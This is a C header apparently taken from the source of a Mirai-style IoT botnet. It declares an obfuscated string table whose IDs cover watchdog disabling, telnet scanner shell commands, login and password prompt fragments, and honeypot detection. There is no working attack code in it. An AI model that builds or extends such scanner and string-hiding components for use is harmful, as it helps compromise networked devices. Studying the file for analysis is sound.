#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};
#define TABLE_MISC_WATCHDOG 1
#define TABLE_MISC_WATCHDOG2 2
#define TABLE_MISC_RAND 3
#define TABLE_MISC_DOG 4
#define TABLE_MISC_DOG1 5
#define TABLE_MISC_DOG2 6
#define TABLE_MISC_DOG3 7
#define TABLE_MISC_DOG4 8
#define TABLE_MISC_DOG5 9
#define TABLE_MISC_DOG6 10
#define TABLE_SCAN_SHELL                11
#define TABLE_SCAN_ENABLE               12  
#define TABLE_SCAN_SYSTEM               13  
#define TABLE_SCAN_SH                   14
#define TABLE_SCAN_QUERY                15  
#define TABLE_SCAN_RESP                 16
#define TABLE_SCAN_ASSWORD 17
#define TABLE_SCAN_OGIN 18
#define TABLE_SCAN_ENTER 19
#define TABLE_SCAN_CONT 20
#define TABLE_SCAN_NAME 21
#define TABLE_NCORRECT 22
#define TABLE_NVALID 23
#define TABLE_NCOM 24
#define TABLE_ATEMP 25
#define TABLE_HPOT 26
#define TABLE_MAX_KEYS  27

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
